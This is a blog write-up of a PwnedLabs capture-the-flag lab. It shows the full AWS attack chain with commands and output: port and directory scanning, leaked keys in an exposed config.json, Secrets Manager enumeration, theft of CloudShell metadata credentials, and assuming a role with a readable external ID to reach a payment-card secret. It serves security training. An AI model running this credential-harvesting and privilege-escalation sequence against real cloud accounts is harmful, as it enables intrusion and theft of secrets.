---
title: Assume Privileged Role with External ID
layout: post
date: 2025-06-27
categories: [Writeups, PwnedLabs]
tags: [Cloud, AWS, AWS-Enumerator, FFUF]
author: bailee
toc: true
description: Using an IP as an entry point, navigate laterally, and determine potential areas of impact.
---
Lab Platform: 
: [PwnedLabs](https://pwnedlabs.io/labs/assume-privileged-role-with-external-id)

---

## Tools, Commands, & Resources
### Tools Used

- AWS CLI
- Nmap
- [Ffuf](https://hackviser.com/tactics/tools/ffuf)
- [Aws-Enumerator](https://github.com/shabarkin/aws-enumerator)

### Commands

- `aws s3 ls <bucket-name>`
   - List out the contents of an S3 bucket. 
    
- `aws secretsmanager list-secrets [--query 'SecretList[*].[Name, Description, ARN]'] [--output json]`
   - List out secrets in AWS SecretsManager, optionally you can use query to output specific values, and the output flag to specify what type of formatting to output it in. 
    
- `aws secretsmanager get-secret-value --secret-id`
   - Get the secret value (creds) of a secret in SecretsManager
    
- `aws-enumerator enum -services all`
    - Use the tool aws-enumerator to enumerate all services in an AWS account.
    
- `aws-enumerator dump --services all`
   - Show the information found from enumerate commands. 
    
- `aws iam get-role --role-name`
   - Get details about a specific role by name. 
    
- `aws sts assume-role --role-arn [role-arn] --role-session-name [session-name] [--external-id [external-id]]`
   - Assume a role by specific ARN of the role, an arbitrary session name to mark the session,  and optionally add an `external-id` for additional verification. 

- `aws secretsmanager get-secret-value --secret-id <secret-id>`
    - Get the secret value for a specific secret ID in SecretsManager.

### References

- <https://awscli.amazonaws.com/v2/documentation/api/latest/reference/secretsmanager/list-secrets.html>
- <https://hackerone.com/reports/1704035>
- <https://research.nccgroup.com/2019/12/18/demystifying-aws-assumerole-and-stsexternalid/>
- <https://techdocs.broadcom.com/us/en/symantec-security-software/endpoint-security-and-management/cloud-workload-protection-for-storage/1-0/AWS_Storage_Configurations_3/aws-external-id-for-iam-role-v131225125-d4995e71615.html>
- <https://awscli.amazonaws.com/v2/documentation/api/latest/reference/secretsmanager/list-secrets.html>

---

## Lab Walkthrough


### Reconnaissance

We were given the IP address 52.0.51.234 as a starting point, so - as always - let’s start off with an nmap scan. 

```
┌──(kali㉿kali)-[~]
└─$ nmap -Pn 52.0.51.234   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 21:56 EDT
Nmap scan report for ec2-52-0-51-234.compute-1.amazonaws.com (52.0.51.234)
Host is up (0.069s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
```

So it looks like there is a web server running here. Let’s see what’s on there. 

![image.png](/assets/img/assumePrivilegedRole/image.png)

We could go through the source code for all of the pages and see what we find, but is there a faster tool for that? Yes - **FFUF**! FFUF (Fuzz Faster U Fool) is a tool that can discovery hidden files and directories on web servers - so it’ll find all the interesting things for us! 

So, after installing ffuf, I’m going to run it for the IP address. (Note: I installed a wordlist from dirbuster to run). 

```
┌──(kali㉿kali)-[~]
└─$ ffuf -w small.txt -u http://52.0.51.234/FUZZ -e .conf,.txt,.json,.xml,.yml,.yaml,.env -mc 200,301 2>/dev/null
config.json             [Status: 200, Size: 832, Words: 141, Lines: 21, Duration: 72ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 62ms]
img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 66ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 78ms]
```

That `config.json` seems interesting to me. There could be some configuration files in there, and maybe someone put some credentials in there? Let’s go see. You could either cURL or add the /config.json to the browser, which is what I did: 

![image.png](/assets/img/assumePrivilegedRole/image1.png)

Well, we have some AWS credentials! Let’s use these and see where we get. 

```
┌──(kali㉿kali)-[~]
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAWHEOTHRF7MLFMRGYH",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/data-bot"
 }
```

This AWS CLI command is basically the ‘whoami’ of AWS, and it looks like this account is named `data-bot` , and we are in AWS account ID 427648302155. Also, remember how the config.json mentioned bucket `hl-data-download`? Let’s see what’s in there. 

```
┌──(kali㉿kali)-[~]
└─$ aws s3 ls hl-data-download            
2023-08-05 17:56:58       5200 LOG-1-TRANSACT.csv
2023-08-05 17:57:05       5200 LOG-10-TRANSACT.csv
2023-08-05 17:58:04       5200 LOG-100-TRANSACT.csv
2023-08-05 17:57:05       5200 LOG-11-TRANSACT.csv
2023-08-05 17:57:06       5200 LOG-12-TRANSACT.csv
2023-08-05 17:57:07       5200 LOG-13-TRANSACT.csv
2023-08-05 17:57:08       5200 LOG-14-TRANSACT.csv
2023-08-05 17:57:08       5200 LOG-15-TRANSACT.csv
2023-08-05 17:57:09       5200 LOG-16-TRANSACT.csv
2023-08-05 17:57:09       5200 LOG-17-TRANSACT.csv
2023-08-05 17:57:10       5200 LOG-18-TRANSACT.csv
2023-08-05 17:57:11       5200 LOG-19-TRANSACT.csv
2023-08-05 17:56:59       5200 LOG-2-TRANSACT.csv
2023-08-05 17:57:11       5200 LOG-20-TRANSACT.csv
2023-08-05 17:57:12       5200 LOG-21-TRANSACT.csv
2023-08-05 17:57:12       5200 LOG-22-TRANSACT.csv
2023-08-05 17:57:13       5200 LOG-23-TRANSACT.csv
2023-08-05 17:57:14       5200 LOG-24-TRANSACT.csv
2023-08-05 17:57:14       5200 LOG-25-TRANSACT.csv
2023-08-05 17:57:15       5200 LOG-26-TRANSACT.csv
2023-08-05 17:57:16       5200 LOG-27-TRANSACT.csv
...
```

### Enumeration

We have permissions to list what’s in the bucket, and there are quite a few log files in here! Looking into one, I see that it contains transactions like this: 
`Bx7w4Pky82Z19,HL-CUST-ORDER-0751,USD,15000,APPROVED`
So it's interesting, but it doesn't give me anything more to go off of. 

I want to quickly see what all the permissions I have as an identity in an AWS account, and there is a tool for that! **AWS-Enumerator** will go through all of the services the account has to (for example, we found we have S3 ‘list’ permissions) and pull out whatever useful information it can. 

Let’s give it a go! 

```
┌──(kali㉿kali)-[~]
└─$ aws-enumerator cred 
Message:  File .env with AWS credentials were created in current folder
                                                                                      
┌──(kali㉿kali)-[~]
└─$ aws-enumerator enum -services all
Message:  Successful APPMESH: 0 / 1
Message:  Successful AMPLIFY: 0 / 1
Message:  Successful APPSYNC: 0 / 1
Message:  Successful ACM: 0 / 1
...
Message:  Successful SECRETSMANAGER: 1 / 2
...
Message:  Successful STORAGEGATEWAY: 0 / 5
Message:  Successful STS: 2 / 2
Message:  Successful SQS: 0 / 1
...
Time: 1m32.469987952s
Message:  Enumeration finished
```

It looks like we have some permissions in Secrets Manager and STS. We can get some further information from AWS-Enumerator on that. 

```
┌──(kali㉿kali)-[~]
└─$ aws-enumerator dump -services secretsmanager

----------------------------------- SECRETSMANAGER -----------------------------------

ListSecrets
```

So we have the ability to ListSecrets! Let’s try that out in the command line. 

After spending some time learning how to form list-secret commands (using [this AWS documentation](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/secretsmanager/list-secrets.html)), I listed out all of the secrets in Secrets Manager. (the —query flag lets you pull out certain JSON fields using JMESPath)

```
┌──(kali㉿kali)-[~]
└─$ aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
[
    [
        "employee-database-admin",
        "Admin access to MySQL employee database",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z"
    ],
    [
        "employee-database",
        "Access to MySQL employee database",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-rpkQvl"
    ],
    [
        "ext/cost-optimization",
        "Allow external partner to access cost optimization user and Huge Logistics resources",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4"
    ],
    [
        "billing/hl-default-payment",
        "Access to the default payment card for Huge Logistics",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK"
    ]
]
```

Ooh, can I get one of those? That could be a ticket for us to escalate privileges. I’m going to see if I can’t get the --secret-id for one of those. 

```
┌──(kali㉿kali)-[~]
└─$ aws secretsmanager get-secret-value --secret-id employee-database-rpkQvl

An error occurred (AccessDeniedException) when calling the GetSecretValue operation: User: arn:aws:iam::427648302155:user/data-bot is not authorized to perform: secretsmanager:GetSecretValue on resource: employee-database-rpkQvl because no identity-based policy allows the secretsmanager:GetSecretValue action
```

Huh… is that the case for all of those? 

```
┌──(kali㉿kali)-[~]
└─$ aws secretsmanager get-secret-value --secret-id ext/cost-optimization                         
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
    "Name": "ext/cost-optimization",
    "VersionId": "f7d6ae91-5afd-4a53-93b9-92ee74d8469c",
    "SecretString": "{\"Username\":\"ext-cost-user\",\"Password\":\"*******CENSORED*******\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-08-04T17:19:28.512000-04:00"
}
```
### Initial Access

Okay, I was only allowed to get secrets for the account ‘ext/cost-optimization’. That’s a username and password - that would work for the console! Let’s log in. 

![image.png](/assets/img/assumePrivilegedRole/image2.png)

That worked! Looks like one of the services that they use is CloudShell - we could use the metadata service to get credentials from it! 

```
[cloudshell-user@ip-10-146-165-99 ~]$ TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    44  100    44    0     0  12324      0 --:--:-- --:--:-- --:--:-- 14666
[cloudshell-user@ip-10-146-165-99 ~]$ curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
{
        "Type": "",
        "AccessKeyId": "ASI**************PZUX",
        "SecretAccessKey": "wTHqYspx*****************n+ng3ACiY9",
        "Token": "IQoJb3JpZ2luX2VjEDgaCXVzLWVhc3QtMSJGMEQCIALmCh72gdWFBXDH5Eegc9iqwoZRvPfbCIVpLBcb4e9OAiBN/mOojcQkncZgW9Vl2wY4zJRsW9DyJjB+HW6WwrlE1Sr2AgghEAAaDDQyNzY0ODMwMjE1NSIMGc96OPiJrPVn7dNaKtMCVSKExQTQbVT8klHktmCXOXqemf6ECBfFyeBFkzkK79/Of7/whUth1W6OoDo24zycqgN6nAfe+7Tg9VieeBz7VvFTBxZsBPbFNLkyT/qgfrSTVE0BMMcyBL3A2e7Evon1+B5NedNI6P1w4dOhf7vy8g2aPLCc6AGijcT8skaIgYv9Z3ngR7XZ0RftY2gxOuRDEPOs8nJzFxvbGL+6iLVD6mhhvH3S2mK1V0oxMU//MTCLrPZmpKtI5d+I5bxtilNuMW112/c30/fb0RcC7IZ2cmIcf/9DPKVwHiXzPXHchuJbBdyw95e+py49gwmYUdBtbEcRrlIGYMTMVlOpzyPOI6IQQohvNod1j1T/N/7mGFjk9JkyhwgxBMqr8Wtdd0MOQfjMwY+zJ8UCLeTBpK/UygumPCwWAip4MzWrvEGZ+TLZjB+cWrb107JkomwJGSHxfXfdMLzsssIGOq4CQuUTx4GqRXbMdU7EQC/7hEcKmVYQxjZKDrAybtyBUD5pLEQyX4jPXsPiw6Dgehz8a+WvYBY2iMOqPzhEP6+B4zoUcGJwSVra+3Y0I8Yrdq+n+h+394JF+vb/VOiA17hSOEEUZLHaQmzFIxFJIKO4vix4s6LT1GnXo2ot4UfYpKcXZ6zMz9pMY/hviXJ2Xphh25ZC2v4N54XMi73o53iDNsWwuDLwN4CMxzbYCJwQSWaX2yyMahVXtI5qMDf44wuSDyCsEXROb0iYJymnRLNMlZc0Jjw83ye/76KIiXZUNvlKBdbs6/qpDPHDYzd/INDjoARa59TRYi1J4wlAoN9y/OSW5e6OIBW6+wBey55WHLT5f/3DgLyjb2+LhFwf3E/BWEihqwqCF69szdHrMRE=",
        "Expiration": "2025-06-13T23:54:51Z",
        "Code": "Success"
}
```

Okay, using `aws configure` with those credentials… 

```
┌──(kali㉿kali)-[~]
└─$ aws configure 
AWS Access Key ID [****************AHHG]: ASI***********3PZUX
AWS Secret Access Key [****************RXCa]: wTHqYsp*****************KANEln+ng3ACiY9
Default region name [us-east-1]: 
Default output format [json]: 
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ aws sts get-caller-identity                                          

An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation: The security token included in the request is invalid.
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ aws configure set aws_session_token "IQoJb3JpZ2luX2VjEDgaCXVzLWVhc3QtMSJGMEQCIALmCh72gdWFBXDH5Eegc9iqwoZRvPfbCIVpLBcb4e9OAiBN/mOojcQkncZgW9Vl2wY4zJRsW9DyJjB+HW6WwrlE1Sr2AgghEAAaDDQyNzY0ODMwMjE1NSIMGc96OPiJrPVn7dNaKtMCVSKExQTQbVT8klHktmCXOXqemf6ECBfFyeBFkzkK79/Of7/whUth1W6OoDo24zycqgN6nAfe+7Tg9VieeBz7VvFTBxZsBPbFNLkyT/qgfrSTVE0BMMcyBL3A2e7Evon1+B5NedNI6P1w4dOhf7vy8g2aPLCc6AGijcT8skaIgYv9Z3ngR7XZ0RftY2gxOuRDEPOs8nJzFxvbGL+6iLVD6mhhvH3S2mK1V0oxMU//MTCLrPZmpKtI5d+I5bxtilNuMW112/c30/fb0RcC7IZ2cmIcf/9DPKVwHiXzPXHchuJbBdyw95e+py49gwmYUdBtbEcRrlIGYMTMVlOpzyPOI6IQQohvNod1j1T/N/7mGFjk9JkyhwgxBMqr8Wtdd0MOQfjMwY+zJ8UCLeTBpK/UygumPCwWAip4MzWrvEGZ+TLZjB+cWrb107JkomwJGSHxfXfdMLzsssIGOq4CQuUTx4GqRXbMdU7EQC/7hEcKmVYQxjZKDrAybtyBUD5pLEQyX4jPXsPiw6Dgehz8a+WvYBY2iMOqPzhEP6+B4zoUcGJwSVra+3Y0I8Yrdq+n+h+394JF+vb/VOiA17hSOEEUZLHaQmzFIxFJIKO4vix4s6LT1GnXo2ot4UfYpKcXZ6zMz9pMY/hviXJ2Xphh25ZC2v4N54XMi73o53iDNsWwuDLwN4CMxzbYCJwQSWaX2yyMahVXtI5qMDf44wuSDyCsEXROb0iYJymnRLNMlZc0Jjw83ye/76KIiXZUNvlKBdbs6/qpDPHDYzd/INDjoARa59TRYi1J4wlAoN9y/OSW5e6OIBW6+wBey55WHLT5f/3DgLyjb2+LhFwf3E/BWEihqwqCF69szdHrMRE="
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAWHEOTHRFTNCWM7FHT",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/ext-cost-user"
}
```

Forgot to add the session token, haha. Okay, now we can use aws-enumerator to quickly list out our permissions. 

I used this source - <https://github.com/shabarkin/aws-enumerator> - to see what commands to use with aws-enumerator. First, I’m running `aws-enumerator enum -services all`, then `aws-enumerator dump --services all` . 

```
┌──(kali㉿kali)-[~]
└─$ aws-enumerator dump -services all

-------------------------------------------------- ACM --------------------------------------------------

Error: No entries in provided service

------------------------------------------------ AMPLIFY ------------------------------------------------

Error: No entries in provided service

...

----------------------------------------------- DYNAMODB -----------------------------------------------

DescribeEndpoints

-------------------------------------------------- EC2 --------------------------------------------------

Error: No entries in provided service

...

-------------------------------------------------- STS --------------------------------------------------

GetCallerIdentity

...

```

So aws-enumerator found Dynamodb:DescribeEndpoints and STS:GetCallerIdentity. Is that it? 

```
┌──(kali㉿kali)-[~]
└─$ aws iam list-attached-user-policies --user-name ext-cost-user
{
    "AttachedPolicies": [
        {
            "PolicyName": "ExtCloudShell",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtCloudShell"
        },
        {
            "PolicyName": "ExtPolicyTest",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtPolicyTest"
        }
    ]
}                                                                                                      
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetRole",
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedRolePolicies",
                        "iam:ListAttachedUserPolicies",
                        "iam:GetRolePolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::427648302155:policy/ExtPolicyTest",
                        "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
                        "arn:aws:iam::427648302155:policy/Payment",
                        "arn:aws:iam::427648302155:user/ext-cost-user"
                    ]
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-06T20:23:42+00:00"
    }
}
```

So we had some attached policies. We already knew about CloudShell, so I want to look into ‘ExtPolicyTest’. Looks like we have some additional IAM actions on the policy ‘Payment’ and the role ‘ExternalCostOpimizeAccess’. What’s that 2nd one? 

```
┌──(kali㉿kali)-[~]
└─$ aws iam get-role --role-name ExternalCostOpimizeAccess
{
    "Role": {
        "Path": "/",
        "RoleName": "ExternalCostOpimizeAccess",
        "RoleId": "AROAWHEOTHRFZP3NQR7WN",
        "Arn": "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
        "CreateDate": "2023-08-04T21:09:30+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::427648302155:user/ext-cost-user"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "StringEquals": {
                            "sts:ExternalId": "37911"
                        }
                    }
                }
            ]
        },
        "Description": "Allow trusted AWS cost optimization partner to access Huge Logistics resources",
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {
            "LastUsedDate": "2025-06-13T18:02:15+00:00",
            "Region": "us-east-1"
        }
    }
}
```

Huh, so our user (ext-cost-user) *can* assume the ‘ExternalCostOpimizeAccess’ role. What is that “Condition”.”StringEquals’.”sts:ExternalID”:”37911” value mean, though? From Amazon’s IAM documentation: 

![image.png](/assets/img/assumePrivilegedRole/image3.png)

So an external ID allows a user to assume a role, kind of like a form of 2FA? However, not exactly, since I can just see it from the get-role command, like I just did. 

```
┌──(kali㉿kali)-[~]
└─$ aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --external-id 37911
{
    "Credentials": {
        "AccessKeyId": "ASIAW************HOGWDO",
        "SecretAccessKey": "SA6np***************QDpsuW/t",
        "SessionToken": "IQoJb3JpZ2luX2VjEDkaCXVzLWVhc3QtMSJHMEUCIAk70CKosX0F6u6+THhT2OU7wSXMwmD81IiUAh1lJljNAiEAyNdKVnQe3s6Jug20e0lk/isxYGvDeTVfSuKU7ASF+YEqpgIIIhAAGgw0Mjc2NDgzMDIxNTUiDDtzNZ5/tTBsiMC3XiqDAgSlB2wujXu5+1EH2T9fSL8z8X5YJwnNmEJfIgDlnV9YfU6sjlM44SlXhjFrCPa9bNcFVtN84XffsrymsoctnFxWJS76NVeZy01Uo3soG3vO/J9KzatTJeQU/jT0CRKnAnwSDxik1zVl/xDWgL5sh19mpJGn/MDrK/SF75qXssY+8SP60PKXHF9SkvHAsC467ZTsd90M0FKoVm3DbZNENMb7dyDe2O8Q6RMJ+UCnkgWCFh4EZ6u1kQpynf/67juN9bNfm3diQBNq3TxT5xmt2Pmku63IVC/OG+G3gLsoEKawWgeifO+jwLIZDM4MCwC2H6EHcdk8Up0h/BChp4uebZ7+jS4wrIOzwgY6nQEyZk2M6OYZwu7o7H2hs/uewDIiBoos8cWh3dTFbAubm32Rfd8ldDYHdOeLHdw9eNF1oeW6v3skKIZ4+ij+YPiwumudiupdXpBcIdNqpkK8X74xJeI/lIBmDxGx0RL1rtsTBTJz61gtoJG4YD5U3mr1fJQWn7P3r2BNAmUK5UKZovVQ9bGfItSDHhMp1lA2SShEpHauAPPx+lf7rj9S",
        "Expiration": "2025-06-14T01:26:20+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAWHEOTHRFZP3NQR7WN:ExternalCostOpimizeAccess",
        "Arn": "arn:aws:sts::427648302155:assumed-role/ExternalCostOpimizeAccess/ExternalCostOpimizeAccess"
    }
}
                                                                                                                               
┌──(kali㉿kali)-[~]
└─$ aws configure 
AWS Access Key ID [****************65MS]: ASIAW************HOGWDO
AWS Secret Access Key [****************NLv9]: SA6npJFEGDx*****************VaQDpsuW/t
Default region name [us-east-1]: 
Default output format [json]: 
                                                                                                                               
┌──(kali㉿kali)-[~]
└─$ aws configure set aws_session_token IQoJb3JpZ2luX2VjEDkaCXVzLWVhc3QtMSJHMEUCIAk70CKosX0F6u6+THhT2OU7wSXMwmD81IiUAh1lJljNAiEAyNdKVnQe3s6Jug20e0lk/isxYGvDeTVfSuKU7ASF+YEqpgIIIhAAGgw0Mjc2NDgzMDIxNTUiDDtzNZ5/tTBsiMC3XiqDAgSlB2wujXu5+1EH2T9fSL8z8X5YJwnNmEJfIgDlnV9YfU6sjlM44SlXhjFrCPa9bNcFVtN84XffsrymsoctnFxWJS76NVeZy01Uo3soG3vO/J9KzatTJeQU/jT0CRKnAnwSDxik1zVl/xDWgL5sh19mpJGn/MDrK/SF75qXssY+8SP60PKXHF9SkvHAsC467ZTsd90M0FKoVm3DbZNENMb7dyDe2O8Q6RMJ+UCnkgWCFh4EZ6u1kQpynf/67juN9bNfm3diQBNq3TxT5xmt2Pmku63IVC/OG+G3gLsoEKawWgeifO+jwLIZDM4MCwC2H6EHcdk8Up0h/BChp4uebZ7+jS4wrIOzwgY6nQEyZk2M6OYZwu7o7H2hs/uewDIiBoos8cWh3dTFbAubm32Rfd8ldDYHdOeLHdw9eNF1oeW6v3skKIZ4+ij+YPiwumudiupdXpBcIdNqpkK8X74xJeI/lIBmDxGx0RL1rtsTBTJz61gtoJG4YD5U3mr1fJQWn7P3r2BNAmUK5UKZovVQ9bGfItSDHhMp1lA2SShEpHauAPPx+lf7rj9S
                                                                                                                               
┌──(kali㉿kali)-[~]
└─$ aws sts get-caller-identity
{
    "UserId": "AROAWHEOTHRFZP3NQR7WN:ExternalCostOpimizeAccess",
    "Account": "427648302155",
    "Arn": "arn:aws:sts::427648302155:assumed-role/ExternalCostOpimizeAccess/ExternalCostOpimizeAccess"
}
```

### Exfiiltration

Looks like that worked, and now we have assumed the role “ExternalCostOpimizeAccess”. What can I do? Can I get one of those secrets from before? 

```
┌──(kali㉿kali)-[~]
└─$ aws secretsmanager get-secret-value --secret-id billing/hl-default-payment
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
    "Name": "billing/hl-default-payment",
    "VersionId": "f8e592ca-4d8a-4a85-b7fa-7059539192c5",
    "SecretString": "{\"Card Brand\":\"VISA\",\"Card Number\":\"4180-5677-2810-4227\",\"Holder Name\":\"Michael Hayes\",\"CVV/CVV2\":\"839\",\"Card Expiry\":\"5/2026\",\"Flag\":\"68131559a7c***************69046fdf425ca\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-08-04T18:33:39.867000-04:00"
}
```
There’s the flag!